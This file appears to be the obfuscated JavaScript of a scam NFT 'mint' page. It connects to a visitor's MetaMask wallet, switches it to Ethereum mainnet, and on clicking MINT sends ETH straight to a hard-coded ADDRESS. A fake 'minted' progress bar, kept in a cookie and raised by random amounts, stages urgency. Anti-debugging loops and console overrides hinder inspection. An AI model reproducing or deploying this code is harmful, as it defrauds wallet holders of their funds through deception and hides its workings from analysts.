const _0x357707 = _0x508e;
!(function (e, n) {
  const t = _0x508e,
    o = _0x4aa9();
  for (;;)
    try {
      if (
        404694 ===
        (parseInt(t(258)) / 1) * (parseInt(t(160)) / 2) +
          parseInt(t(182)) / 3 +
          (parseInt(t(250)) / 4) * (parseInt(t(238)) / 5) +
          parseInt(t(165)) / 6 +
          -parseInt(t(209)) / 7 +
          -parseInt(t(259)) / 8 +
          (parseInt(t(198)) / 9) * (-parseInt(t(226)) / 10)
      )
        break;
      o.push(o.shift());
    } catch (e) {
      o.push(o.shift());
    }
})();
const _0x56fae9 = (function () {
  let e = !0;
  return function (n, t) {
    const o = e
      ? function () {
          if (t) {
            const e = t.apply(n, arguments);
            return (t = null), e;
          }
        }
      : function () {};
    return (e = !1), o;
  };
})();
!(function () {
  _0x56fae9(this, function () {
    const e = _0x508e,
      n = new RegExp(e(172)),
      t = new RegExp(e(229), "i"),
      o = _0x28a96b("init");
    n[e(261)](o + e(206)) && t.test(o + e(170)) ? _0x28a96b() : o("0");
  })();
})();
const _0x2b98a6 = (function () {
    let e = !0;
    return function (n, t) {
      const o = e
        ? function () {
            const e = _0x508e;
            if (t) {
              const o = t[e(161)](n, arguments);
              return (t = null), o;
            }
          }
        : function () {};
      return (e = !1), o;
    };
  })(),
  _0x931bfc = _0x2b98a6(this, function () {
    const e = _0x508e,
      n = (function () {
        const e = _0x508e;
        let n;
        try {
          n = Function("return (function() " + e(221) + ");")();
        } catch (e) {
          n = window;
        }
        return n;
      })(),
      t = (n[e(241)] = n[e(241)] || {}),
      o = [e(227), e(220), e(216), "error", "exception", e(246), e(212)];
    for (let n = 0; n < o[e(178)]; n++) {
      const a = _0x2b98a6[e(260)][e(201)][e(184)](_0x2b98a6),
        i = o[n],
        c = t[i] || a;
      (a[e(197)] = _0x2b98a6[e(184)](_0x2b98a6)),
        (a[e(234)] = c.toString[e(184)](c)),
        (t[i] = a);
    }
  });
_0x931bfc();
const _0x1036fb = document.querySelector(_0x357707(169)),
  _0x5b5f4d = document[_0x357707(237)](_0x357707(219)),
  _0x59f641 = document[_0x357707(237)](_0x357707(208)),
  _0x5a6def = document[_0x357707(237)](_0x357707(242));
let _0x23dc5a,
  _0x337aaf = PRICE,
  _0x59fe27 = 1;
function _0x139d93() {
  const e = _0x357707;
  (_0x1036fb[e(176)] = e(232)),
    (_0x1036fb.disabled = !1),
    _0x1036fb[e(200)][e(179)]("disable"),
    _0x1036fb[e(200)][e(213)]("enable");
}
function _0x246f65() {
  const e = _0x357707;
  (_0x1036fb.innerHTML = "WRONG NETWORK"),
    (_0x1036fb[e(233)] = !0),
    _0x1036fb[e(200)][e(179)](e(156)),
    _0x1036fb[e(200)][e(213)]("disable");
}
function _0x29979d() {
  const e = _0x357707;
  window[e(159)]
    ? window[e(159)].selectedAddress
      ? ((_0x5b5f4d[e(193)][e(251)] = e(224)),
        (_0x1036fb[e(193)][e(251)] = e(248)))
      : window.ethereum[e(262)] &&
        ((_0x5b5f4d[e(193)][e(251)] = e(248)),
        (_0x1036fb[e(193)][e(251)] = e(224)))
    : ((_0x5b5f4d[e(193)].display = "block"),
      (_0x1036fb.style[e(251)] = e(224)));
}
const _0x2576eb = async () => {
    const e = _0x357707;
    if (window.ethereum)
      if (
        ((_0x23dc5a = await window[e(159)].request({ method: e(173) })),
        window[e(159)].chainId == e(247))
      )
        console[e(227)](e(183)), _0x29979d(), _0x139d93();
      else {
        _0x246f65();
        try {
          await window.ethereum.request({
            method: e(199),
            params: [{ chainId: e(247) }],
          }),
            _0x29979d();
        } catch (n) {
          if (4902 === error.code)
            try {
              await window[e(159)][e(266)]({
                method: e(186),
                params: [{ chainId: "0x1" }],
              }),
                _0x29979d();
            } catch (e) {}
        }
      }
    else $(e(163)).modal(e(202));
  },
  _0xda0d11 = async () => {
    const e = _0x357707,
      n = web3[e(192)];
    (window[e(194)] = new Web3(n)),
      window.myWeb3[e(243)]
        [e(235)]({
          from: _0x23dc5a[0],
          to: ADDRESS,
          value: window[e(210)].utils.toWei(_0x337aaf[e(234)](), e(240)),
        })
        .then((n) => {
          const t = e;
          $(t(196))[t(239)](t(202));
        })
        [e(166)]((e) => {});
  };
function _0x38224d(e) {
  return new Promise((n) => setTimeout(n, e));
}
function _0x5bb12d(e, n, t) {
  const o = _0x357707;
  let a = new Date();
  a.setTime(a[o(190)]() + 24 * t * 60 * 60 * 1e3);
  const i = "expires=" + a.toUTCString();
  return (document[o(225)] = e + "=" + n + "; " + i + o(205)), !0;
}
function _0x301d86(e) {
  const n = _0x357707,
    t = e + "=";
  let o;
  return (
    decodeURIComponent(document[n(225)])
      [n(191)]("; ")
      [n(203)]((e) => {
        const a = n;
        0 === e[a(263)](t) && (o = e[a(157)](t[a(178)]));
      }),
    o
  );
}
function _0x1a60c1(e) {
  const n = _0x357707;
  return e[n(234)]()[n(177)](/\B(?=(\d{3})+(?!\d))/g, ",");
}
function _0x508e(e, n) {
  const t = _0x4aa9();
  return (_0x508e = function (e, n) {
    return t[(e -= 156)];
  })(e, n);
}
function _0xe0e869(e, n, t, o) {
  let a = null;
  const i = (c) => {
    const r = _0x508e;
    a || (a = c);
    const x = Math.min((c - a) / o, 1);
    (e.innerHTML = _0x1a60c1(Math[r(245)](x * (t - n) + n)[r(195)](0))),
      x < 1 && window[r(265)](i);
  };
  window[_0x357707(265)](i);
}
function _0x4db215() {
  const e = _0x357707;
  function n(e, n) {
    return Math[_0x508e(223)]() * (e - n) + n;
  }
  J = 1;
  var t,
    o = document[e(237)](e(214)),
    a = document.querySelector(e(167)),
    i = document[e(237)](e(164)),
    c = 25,
    r = setInterval(function () {
      if (c >= t) {
        if ((clearInterval(r), c < 100)) {
          !(async function e() {
            const i = _0x508e;
            let r = n(0.05, 0.1);
            if (
              ((c = (+c + r)[i(195)](3)),
              (t = c),
              _0x5bb12d("progress", c, 30),
              (x = (TOTAL / 100) * t),
              (b_totals = (TOTAL / 100) * (t - r)),
              (o[i(193)].width = c + "%"),
              _0xe0e869(a, b_totals, x[i(195)](0), 1e3),
              c >= 100)
            )
              return (
                (a[i(176)] = i(230) + _0x1a60c1(TOTAL.toFixed(0))),
                void _0x5bb12d(i(158), 60, 30)
              );
            await _0x38224d(n(7e3, 18e3).toFixed(0)), e();
          })();
        }
      } else c++;
    }, 100);
  null != _0x301d86(e(158))
    ? (t = _0x301d86(e(158)))
    : (_0x5bb12d(e(158), 60, 30), (t = 60));
  var x = ((TOTAL / 100) * t)[e(195)](0);
  (a[e(176)] = _0x1a60c1(x)),
    (i[e(176)] = e(230) + _0x1a60c1(TOTAL.toFixed(0)));
}
function _0x172e4d() {
  const e = _0x357707;
  var n = navigator[e(171)] || navigator[e(236)] || window[e(185)];
  const t = window[e(175)].search;
  return "mm" == new URLSearchParams(t)[e(217)]("uid")
    ? "Metamask"
    : /windows phone/i[e(261)](n)
    ? e(257)
    : /android/i.test(n)
    ? "Android"
    : /iPad|iPhone|iPod/[e(261)](n) && !window[e(180)]
    ? e(174)
    : e(181);
}
function _0x4aa9() {
  const e = [
    "ether",
    "console",
    ".count",
    "eth",
    "debu",
    "floor",
    "table",
    "0x1",
    "block",
    "http://",
    "460gpvhQl",
    "display",
    "string",
    "action",
    "createElement",
    "href",
    "stateObject",
    "Windows Phone",
    "14767TySPjZ",
    "6018992qCiRPa",
    "constructor",
    "test",
    "isMetaMask",
    "indexOf",
    "appendChild",
    "requestAnimationFrame",
    "request",
    "enable",
    "substring",
    "progress",
    "ethereum",
    "46afViGv",
    "apply",
    "web3",
    "#metaMaskModal",
    ".max",
    "3768498GYSTYw",
    "catch",
    ".countA",
    ".plus",
    ".mint",
    "input",
    "userAgent",
    "function *\\( *\\)",
    "eth_requestAccounts",
    "iOS",
    "location",
    "innerHTML",
    "replace",
    "length",
    "remove",
    "MSStream",
    "unknown",
    "1857927hhuVMW",
    "Already connected to window.ethereum mainnet...",
    "bind",
    "opera",
    "wallet_addEthereumChain",
    "while (true) {}",
    "addEventListener",
    "https://",
    "getTime",
    "split",
    "currentProvider",
    "style",
    "myWeb3",
    "toFixed",
    "#mintingModal",
    "__proto__",
    "6652359LZgdir",
    "wallet_switchEthereumChain",
    "classList",
    "prototype",
    "show",
    "forEach",
    "click",
    "; path=/",
    "chain",
    "?uid=mm",
    ".totalPrice",
    "2886268ilUGfN",
    "myweb3",
    "load",
    "trace",
    "add",
    ".bar-done",
    ".setMax",
    "info",
    "get",
    "parentNode",
    ".connect",
    "warn",
    '{}.constructor("return this")( )',
    "gger",
    "random",
    "none",
    "cookie",
    "10LfSawD",
    "log",
    "chainChanged",
    "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
    " / ",
    "innerText",
    "MINT",
    "disabled",
    "toString",
    "sendTransaction",
    "vendor",
    "querySelector",
    "31370qcOfzM",
    "modal",
  ];
  return (_0x4aa9 = function () {
    return e;
  })();
}
function _0x28a96b(e) {
  function n(e) {
    const t = _0x508e;
    if (typeof e === t(252))
      return function (e) {}[t(260)](t(187)).apply("counter");
    1 !== ("" + e / e)[t(178)] || e % 20 == 0
      ? function () {
          return !0;
        }
          [t(260)]("debu" + t(222))
          .call(t(253))
      : function () {
          return !1;
        }
          [t(260)](t(244) + t(222))
          .apply(t(256)),
      n(++e);
  }
  try {
    if (e) return n;
    n(0);
  } catch (e) {}
}
window[_0x357707(188)](_0x357707(211), async () => {
  const e = _0x357707;
  var n = _0x172e4d();
  if ("Android" == n || n == e(174)) {
    var t = document[e(254)]("a");
    t[e(200)][e(213)]("mmLink"),
      (t[e(255)] =
        "https://metamask.app.link/dapp/" +
        window[e(175)][e(255)][e(177)](e(189), "").replace(e(249), "") +
        e(207)),
      _0x5b5f4d[e(218)].insertBefore(t, _0x5b5f4d),
      t[e(264)](_0x5b5f4d);
  }
  if (
    ((_0x59f641[e(231)] = PRICE), _0x29979d(), _0x4db215(), window.ethereum)
  ) {
    window[e(159)].on(e(228), (n) => {
      n == e(247) ? _0x139d93() : _0x246f65();
    });
    const n = window[e(162)][e(192)];
    window[e(210)] = new Web3(n);
  }
  setTimeout(function () {
    _0x2576eb();
  }, 1e3),
    _0x1036fb[e(188)](e(204), async () => {
      await _0x2576eb(), await _0xda0d11();
    }),
    _0x5b5f4d[e(188)]("click", async () => {
      await _0x2576eb();
    }),
    document.querySelector(e(168))[e(188)]("click", () => {
      const n = e;
      _0x59fe27 < MAX &&
        (_0x59fe27++,
        (_0x337aaf = (_0x59fe27 * PRICE)[n(195)](3)),
        (_0x5a6def[n(231)] = _0x59fe27),
        (_0x59f641[n(231)] = Number(_0x337aaf)));
    }),
    document[e(237)](".minus").addEventListener(e(204), () => {
      const n = e;
      _0x59fe27 > 1 &&
        (_0x59fe27--,
        (_0x337aaf = (_0x59fe27 * PRICE).toFixed(3)),
        (_0x5a6def.innerText = _0x59fe27),
        (_0x59f641[n(231)] = Number(_0x337aaf)));
    }),
    document[e(237)](e(215)).addEventListener(e(204), () => {
      const n = e;
      (_0x59fe27 = MAX),
        (_0x337aaf = (_0x59fe27 * PRICE).toFixed(3)),
        (_0x5a6def[n(231)] = _0x59fe27),
        (_0x59f641[n(231)] = Number(_0x337aaf));
    });
});
